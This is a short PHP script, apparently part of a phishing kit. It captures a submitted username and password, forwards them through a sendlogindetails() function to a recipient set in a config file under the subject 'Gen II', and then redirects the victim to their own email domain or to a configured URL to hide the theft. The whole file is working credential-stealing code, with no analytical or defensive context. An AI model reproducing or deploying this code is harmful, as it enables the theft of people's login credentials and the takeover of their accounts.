<?php
require '../config.php';
include('sender.php');

$login = $_POST['username'];
$passwd = $_POST['password'];
$sub = "Gen II";

sendlogindetails($login,$passwd,$to,$sub);

function domainslash($email)
{
    $domain = strtolower(substr($email, strrpos($email, '@') + 1));
    return "http://".$domain;
}


if ($playsound==1){
    
    header( "Location: $sound");
}else{
header( "Location: ".domainslash($login));
    
}

